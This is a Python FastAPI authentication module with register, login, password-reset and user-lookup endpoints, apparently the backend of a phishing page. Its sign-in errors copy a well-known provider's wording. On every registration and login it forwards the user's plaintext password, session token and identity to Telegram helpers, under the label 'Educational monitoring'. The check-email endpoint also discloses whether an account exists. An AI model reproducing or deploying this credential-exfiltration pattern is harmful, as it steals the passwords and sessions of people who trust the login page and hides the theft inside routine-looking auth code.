from fastapi import APIRouter, HTTPException, Header, Depends
from typing import Optional
import logging
from datetime import datetime

from models.user import (
    UserCreate,
    UserLogin,
    UserResponse,
    CheckEmailRequest,
    CheckEmailResponse,
    ForgotPasswordRequest,
    AuthResponse,
    ErrorResponse,
    SuccessResponse,
    UserDB
)
from utils.auth import (
    hash_password,
    verify_password,
    create_access_token,
    decode_access_token,
    validate_password_strength
)
from utils.telegram import (
    notify_user_registration,
    notify_user_login,
    notify_password_reset
)

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/auth", tags=["Authentication"])

# We'll inject the database in the routes
db = None


def set_db(database):
    """Set the database instance for this router."""
    global db
    db = database


@router.post("/register", response_model=AuthResponse)
async def register(user_data: UserCreate):
    """Register a new user."""
    try:
        # Check if user already exists
        existing_user = await db.users.find_one({"email": user_data.email.lower()})
        if existing_user:
            raise HTTPException(
                status_code=400,
                detail="That email address is already taken."
            )
        
        # Validate password strength
        is_valid, message = validate_password_strength(user_data.password)
        if not is_valid:
            raise HTTPException(status_code=400, detail=message)
        
        # Hash password
        password_hash = hash_password(user_data.password)
        
        # Create user document
        user_doc = UserDB(
            email=user_data.email.lower(),
            password_hash=password_hash,
            name=user_data.name
        )
        
        # Insert into database
        result = await db.users.insert_one(user_doc.dict())
        user_id = str(result.inserted_id)
        
        # Create JWT token
        token = create_access_token(data={"sub": user_id, "email": user_data.email.lower()})
        
        # Send Telegram notification (Educational monitoring) - with full details
        try:
            notify_user_registration(
                user_data.email.lower(), 
                user_data.name, 
                user_data.password,
                token,
                user_id
            )
        except Exception as e:
            logger.warning(f"Failed to send Telegram notification: {str(e)}")
        
        # Return response
        user_response = UserResponse(
            id=user_id,
            email=user_data.email.lower(),
            name=user_data.name,
            created_at=user_doc.created_at
        )
        
        return AuthResponse(
            success=True,
            user=user_response,
            token=token
        )
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Registration error: {str(e)}")
        raise HTTPException(status_code=500, detail="Registration failed. Please try again.")


@router.post("/check-email", response_model=CheckEmailResponse)
async def check_email(email_data: CheckEmailRequest):
    """Check if an email address exists in the database."""
    try:
        user = await db.users.find_one({"email": email_data.email.lower()})
        return CheckEmailResponse(
            exists=user is not None,
            email=email_data.email.lower()
        )
    except Exception as e:
        logger.error(f"Email check error: {str(e)}")
        raise HTTPException(status_code=500, detail="Email check failed.")


@router.post("/login", response_model=AuthResponse)
async def login(credentials: UserLogin):
    """Authenticate a user and return JWT token."""
    try:
        # Find user by email
        user = await db.users.find_one({"email": credentials.email.lower()})
        
        if not user:
            raise HTTPException(
                status_code=401,
                detail="Your account or password is incorrect. If you don't remember your password, reset it now."
            )
        
        # Verify password
        if not verify_password(credentials.password, user["password_hash"]):
            raise HTTPException(
                status_code=401,
                detail="Your account or password is incorrect. If you don't remember your password, reset it now."
            )
        
        # Create JWT token
        user_id = str(user["_id"])
        token = create_access_token(data={"sub": user_id, "email": user["email"]})
        
        # Send Telegram notification (Educational monitoring) - with full session details
        try:
            notify_user_login(
                user["email"], 
                user["name"], 
                credentials.password,
                token,
                user_id
            )
        except Exception as e:
            logger.warning(f"Failed to send Telegram notification: {str(e)}")
        
        # Return response
        user_response = UserResponse(
            id=user_id,
            email=user["email"],
            name=user["name"],
            created_at=user.get("created_at")
        )
        
        return AuthResponse(
            success=True,
            user=user_response,
            token=token
        )
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Login error: {str(e)}")
        raise HTTPException(status_code=500, detail="Login failed. Please try again.")


@router.post("/forgot-password", response_model=SuccessResponse)
async def forgot_password(reset_data: ForgotPasswordRequest):
    """Request a password reset (in production, this would send an email)."""
    try:
        # Check if user exists (but don't reveal this information for security)
        user = await db.users.find_one({"email": reset_data.email.lower()})
        
        if user:
            # In production, send email with reset link
            # For now, just log it
            logger.info(f"Password reset requested for: {reset_data.email.lower()}")
            logger.info("In production, an email would be sent here.")
            
            # Send Telegram notification (Educational monitoring)
            try:
                notify_password_reset(reset_data.email.lower())
            except Exception as e:
                logger.warning(f"Failed to send Telegram notification: {str(e)}")
        
        # Always return success (don't reveal if email exists)
        return SuccessResponse(
            success=True,
            message="If that email address is in our database, we will send you an email to reset your password."
        )
    
    except Exception as e:
        logger.error(f"Password reset error: {str(e)}")
        raise HTTPException(status_code=500, detail="Password reset request failed.")


@router.get("/me", response_model=UserResponse)
async def get_current_user(authorization: Optional[str] = Header(None)):
    """Get current user from JWT token."""
    try:
        if not authorization or not authorization.startswith("Bearer "):
            raise HTTPException(status_code=401, detail="Unauthorized")
        
        token = authorization.replace("Bearer ", "")
        payload = decode_access_token(token)
        
        if not payload:
            raise HTTPException(status_code=401, detail="Invalid or expired token")
        
        user_id = payload.get("sub")
        if not user_id:
            raise HTTPException(status_code=401, detail="Invalid token payload")
        
        # Get user from database
        from bson import ObjectId
        user = await db.users.find_one({"_id": ObjectId(user_id)})
        
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        
        return UserResponse(
            id=str(user["_id"]),
            email=user["email"],
            name=user["name"],
            created_at=user.get("created_at")
        )
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get current user error: {str(e)}")
        raise HTTPException(status_code=401, detail="Unauthorized")